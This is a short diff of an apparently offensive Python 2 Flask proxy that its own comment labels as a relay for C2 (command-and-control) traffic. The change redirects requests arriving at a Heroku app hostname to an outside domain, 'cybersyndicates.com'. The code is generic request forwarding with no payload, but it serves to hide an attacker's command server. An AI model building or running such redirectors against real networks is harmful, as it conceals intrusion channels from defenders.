@@ -7,7 +7,7 @@ import json
 
 # STATIC VAR
 __DEBUG = True
-__FORWARD_DOMAIN = '10.1.6.76'
+__FORWARD_DOMAIN = 'cybersyndicates.com'
 __CURRENT_DOMAIN = '192.168.1.227'
 
 ###############################
@@ -72,9 +72,10 @@ def proxy_required(func):
             if __DEBUG:
                 debug_req.print_request(request)
             # setup our proxy for C2
+            print request.url.replace('tranquil-dawn-50102.herokuapp.com', __FORWARD_DOMAIN)
             resp = requests.request(
                 method=request.method,
-                url=request.url.replace('10.1.6.61', __FORWARD_DOMAIN),
+                url=request.url.replace('tranquil-dawn-50102.herokuapp.com', __FORWARD_DOMAIN),
                 headers={key: value for (key, value) in request.headers if key != 'Host'},
                 data=request.get_data(),
                 cookies=request.cookies,
@@ -83,7 +84,7 @@ def proxy_required(func):
             headers = [(name, value) for (name, value) in resp.raw.headers.items()
                        if name.lower() not in excluded_headers]
             response = Response(resp.content, resp.status_code, headers)
-            print response
+            print "proxy response: %s" % (response)
             return response
             if not response:
                 # FORWARD RESPONSE TO SERVER
